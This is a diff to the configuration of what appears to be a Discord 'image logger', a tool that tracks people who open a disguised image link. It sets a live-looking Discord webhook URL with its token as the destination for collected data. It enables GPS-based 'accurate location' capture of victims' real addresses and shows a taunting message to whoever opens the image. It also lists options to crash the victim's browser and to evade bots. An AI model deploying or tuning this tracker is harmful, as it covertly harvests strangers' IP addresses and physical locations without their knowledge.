@@ -14,22 +14,22 @@ __author__ = "XSYTHO"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1357230392507240469/4XskV-5LnfH478Iu7i4U8Egvig150SZ-wX0CtGk1PdqJhkxlFD4pFYgyZWSPrVzo-7YX",
-    "image": "https://media.discordapp.net/attachments/1166709401676169246/1308370929432268832/image.png?ex=67f83f21&is=67f6eda1&hm=555d9358d169bd835305aaf05b928b986d26dc662a8ae1048c33478df2aa3fc2&=&format=webp&quality=lossless&width=1006&height=595", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "image": "https://cdn.discordapp.com/attachments/1320682733718208536/1362412449168494692/stan.jpg?ex=68024cf8&is=6800fb78&hm=2d333ba09a4e22c0e830a041baf240c6c5d08a22c0b51ddbc777bf02024bacb5&", 
+                                              
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "STAN", # Set this to the name you want the webhook to have
-    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "STAN", 
+    "color": 0xFF0000,
 
     # OPTIONS #
     "crashBrowser": False, 
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, 
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been KUPAL", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "DAVID NGA EH BAT NAGTATAKA KAPA?", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -38,8 +38,8 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
